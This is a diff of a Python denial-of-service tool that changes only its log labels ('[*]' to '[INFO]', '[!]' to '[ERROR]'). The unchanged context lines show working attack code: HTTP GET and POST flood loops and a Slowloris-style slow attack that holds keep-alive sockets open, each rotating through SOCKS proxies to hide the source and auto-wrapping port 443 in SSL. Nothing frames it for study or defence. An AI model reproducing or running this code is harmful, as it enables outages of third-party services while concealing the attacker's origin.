@@ -110,14 +110,14 @@ def cc(socks_type):
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 10:
-				print("[!] Target Or Proxy Maybe Down | Changing Proxy")
+				print("[ERROR] Target Or Proxy Maybe Down | Changing Proxy")
 				break
 			s = socks.socksocket()
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-			print ("[*] "+n+" Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[INFO] "+n+" Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					useragent = "User-Agent: " +getuseragent() + "\r\n"
@@ -159,7 +159,7 @@ def post(socks_type):
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 10:
-				print("[!] Target Or Proxy Maybe Down | Changing Proxy")
+				print("[ERROR] Target Or Proxy Maybe Down | Changing Proxy")
 				break
 			s = socks.socksocket()
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -167,7 +167,7 @@ def post(socks_type):
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[INFO] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
@@ -188,7 +188,7 @@ def slow(conn,socks_type):
 		if socks_type == 5:
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	except:
-		print("[!] Something Wrong In Socks List")
+		print("[ERROR] Something Wrong In Socks List")
 		slow(conn,socks_type)#restart
 	for _ in range(conn):
 		try:
@@ -206,7 +206,7 @@ def slow(conn,socks_type):
 			s.send(("Connection:keep-alive").encode("utf-8"))
 			
 			socket_list.append(s)
-			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+			sys.stdout.write("[INFO] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 		except:
 			s.close()
@@ -215,18 +215,18 @@ def slow(conn,socks_type):
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+			sys.stdout.write("[INFO] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	while True:
 		for s in list(socket_list):
 			try:
 				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.write("[INFO] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
 				s.close()
 				socket_list.remove(s)
-				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.write("[INFO] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 		proxy = random.choice(proxies).strip().split(":")
 		if socks_type == 4:
@@ -246,7 +246,7 @@ def slow(conn,socks_type):
 					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
 				s.send(("Connection:keep-alive").encode("utf-8"))
 				socket_list.append(s)
-				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.write("[INFO] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
 				proxy = random.choice(proxies).strip().split(":")
@@ -254,7 +254,7 @@ def slow(conn,socks_type):
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 				if socks_type == 5:
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.write("[INFO] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 				pass
 nums = 0
